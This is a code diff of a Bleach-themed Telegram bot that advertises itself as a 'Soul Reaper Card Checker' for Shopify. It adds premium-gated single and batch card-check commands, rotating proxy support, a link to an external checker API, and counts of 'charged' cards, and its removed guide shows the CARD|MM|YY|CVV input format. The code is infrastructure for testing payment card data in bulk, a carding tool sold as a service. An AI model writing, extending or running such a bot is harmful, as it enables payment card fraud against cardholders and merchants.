-        "• Advanced analytics\n"
-        "• Priority support"
-    )
+async def bankai_handler(event):
+    user_id = event.sender_id
+    prem    = is_premium(user_id)
+
+    if prem:
+        msg = (
+            "<b>🔥 『 BANKAI ACTIVE 』🔥</b>\n\n"
+            "✅ Full Zanpakuto Arsenal unlocked\n"
+            "✅ Unlimited checks\n"
+            "✅ Batch processing\n"
+            "✅ Priority routing\n\n"
+            "<b>⚫ You are a true Soul Reaper!</b>"
+        )
+    else:
+        msg = (
+            "<b>🔥 『 BANKAI MODE 』🔥</b>\n\n"
+            "⛔ <b>Reiatsu Seal Active</b>\n\n"
+            "Bankai requires premium access.\n"
+            "Contact Soul Society admin to unlock.\n\n"
+            "<b>Premium unlocks:</b>\n"
+            "• /cc single check\n"
+            "• /chk batch check\n"
+            "• Full Zanpakuto Arsenal\n"
+            "• Unlimited usage"
+        )
 
     await event.edit(msg, parse_mode='html')
-    await event.answer("🔥 BANKAI!", alert=True)
+    await event.answer("🔥 BANKAI!", alert=not prem)
 
-@bot.on(events.CallbackQuery(pattern=b"guide"))
-async def guide(event):
-    """Soul Reaper Guide"""
-    msg = BleachEmoji.render(
-        "<b>📖 SOUL REAPER GUIDE</b>\n\n"
-        "<b>Getting Started:</b>\n"
-        "1️⃣ Use <code>/check CARD|MM|YY|CVV</code>\n"
-        "2️⃣ Select Zanpakuto sword\n"
-        "3️⃣ Gather Reiatsu (power)\n"
-        "4️⃣ Unlock Bankai mode\n\n"
-        "<b>Ranks:</b>\n"
-        "👨‍🎓 Academy - 0-20%\n"
-        "⚔️ Seated - 20-40%\n"
-        "👑 Captain - 40-60%\n"
-        "⚫ Kenpachi - 60-80%\n"
-        "🌟 Zero Squad - 80-100%\n\n"
-        "<b>⛩️ Welcome to Soul Society!</b>"
+@bot.on(events.CallbackQuery(pattern=b"proxy_info"))
+async def proxy_info_handler(event):
+    proxies = load_proxies()
+    await event.edit(
+        f"<b>🔵 『 PROXY STATUS 』</b>\n\n"
+        f"<b>Loaded proxies:</b> {len(proxies)}\n\n"
+        f"<b>Format:</b>\n"
+        f"<code>ip:port:user:pass</code>\n\n"
+        f"<b>Add proxies:</b> Edit proxy.txt",
+        parse_mode='html'
     )
-
-    await event.edit(msg, parse_mode='html')
     await event.answer()
 
-print("🔥 ╔════════════════════════════════╗ 🔥")
-print("🔥 ║   BANKAI SHOP - ACTIVATED      ║ 🔥")
-print("🔥 ║  Soul Reaper Card Checker     ║ 🔥")
-print("🔥 ║   Bleach x Shopify Fusion     ║ 🔥")
-print("🔥 ╚════════════════════════════════╝ 🔥")
-print("\n⚔️ Zanpakuto Engine: Ready")
-print("💜 Reiatsu System: Online")
-print("🌟 Soul Society Portal: Connected\n")
+@bot.on(events.CallbackQuery(pattern=b"api_status"))
+async def api_status_handler(event):
+    await event.answer("🔄 Checking...", alert=False)
+    try:
+        timeout = aiohttp.ClientTimeout(total=10)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            async with session.get(CHECKER_API.replace('/shopify', '/health')) as resp:
+                online = resp.status == 200
+    except:
+        online = False
+
+    status = "✅ ONLINE" if online else "❌ OFFLINE"
+    await event.edit(
+        f"<b>🟡 『 API STATUS 』</b>\n\n"
+        f"<b>Zanpakuto Engine:</b> {status}\n"
+        f"<b>Endpoint:</b> <code>{CHECKER_API}</code>",
+        parse_mode='html'
+    )
+
+@bot.on(events.CallbackQuery(pattern=b"society"))
+async def society_handler(event):
+    souls = load_souls()
+    total_users   = len(souls)
+    total_checks  = sum(s.get('checks', 0) for s in souls.values())
+    total_charged = sum(s.get('charged', 0) for s in souls.values())
+
+    await event.edit(
+        f"<b>⛩️ 『 SOUL SOCIETY STATS 』</b>\n\n"
+        f"<b>👥 Total Reapers:</b> {total_users}\n"
+        f"<b>⚔️ Total Checks:</b>  {total_checks}\n"
+        f"<b>💎 Total Charged:</b> {total_charged}\n\n"
+        f"<b>🌟 Powered by Zanpakuto Engine</b>",
+        parse_mode='html'
+    )
+    await event.answer()
+
+@bot.on(events.CallbackQuery(pattern=b"back_start"))
+async def back_start(event):
+    await event.answer()
+    await event.delete()
+    await event.respond('/start')
+
+# Pause/Stop session handlers
+@bot.on(events.CallbackQuery(pattern=rb"pause_(.+)"))
+async def pause_handler(event):
+    sid = event.data.decode().replace("pause_", "")
+    if sid in active_sessions:
+        active_sessions[sid]['paused'] = not active_sessions[sid]['paused']
+        state = "⏸️ Paused" if active_sessions[sid]['paused'] else "▶️ Resumed"
+        await event.answer(state, alert=False)
+
+@bot.on(events.CallbackQuery(pattern=rb"stop_(.+)"))
+async def stop_handler(event):
+    sid = event.data.decode().replace("stop_", "")
+    if sid in active_sessions:
+        active_sessions[sid]['stopped'] = True
+        del active_sessions[sid]
+    await event.answer("🛑 Stopping...", alert=False)
+
+# ============================================================================
+# 🚀 STARTUP
+# ============================================================================
+
+print("\n🔥 ╔══════════════════════════════════╗ 🔥")
+print("🔥 ║   𝗕𝗔𝗡𝗞𝗔𝗜 𝗦𝗛𝗢𝗣 - ACTIVATED        ║ 🔥")
+print("🔥 ║   Soul Reaper Card Checker        ║ 🔥")
+print("🔥 ║   Bleach × Shopify Fusion         ║ 🔥")
+print("🔥 ╚══════════════════════════════════╝ 🔥\n")
+print("⚔️  Zanpakuto Engine : Connected")
+print(f"🌐 Checker API     : {CHECKER_API}")
+print("💜 Reiatsu System  : Online")
+print("⛩️  Soul Society    : Ready\n")
 
 bot.run_until_disconnected()
